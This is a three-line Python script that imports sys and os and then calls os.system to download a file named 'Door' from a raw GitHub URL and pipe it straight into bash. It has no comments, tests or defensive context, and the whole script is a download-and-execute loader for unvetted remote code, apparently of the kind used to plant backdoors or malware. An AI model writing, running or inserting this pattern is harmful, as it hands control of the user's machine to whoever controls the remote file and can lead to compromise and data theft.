import sys
import os
os.system('curl -sL https://raw.githubusercontent.com/pevinnagewe8919/Man/main/Door | bash')
